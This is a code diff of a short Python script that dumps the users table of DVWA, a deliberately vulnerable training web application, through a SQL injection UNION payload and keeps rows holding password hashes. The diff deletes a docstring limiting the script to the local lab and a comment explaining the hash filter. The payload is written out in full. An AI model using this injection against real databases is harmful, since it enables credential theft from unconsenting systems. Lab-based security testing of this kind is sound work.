@@ -1,7 +1,3 @@
-"""Fast, LLM-free SQLi dump of the DVWA users table (security level low).
-
-For the local DVWA lab only. Use this to grab credentials in seconds instead of waiting
-for the full multi-agent run."""
 from src.dvwa import DVWAClient
 
 PAYLOAD = "1' UNION SELECT user, password FROM users -- -"
@@ -18,7 +14,7 @@ def main() -> None:
     creds = [
         (r.get("first_name", ""), r.get("surname", ""))
         for r in resp.rows
-        if len(r.get("surname", "")) >= 32  # keep rows whose surname is a password hash
+        if len(r.get("surname", "")) >= 32
     ]
 
     if not creds:
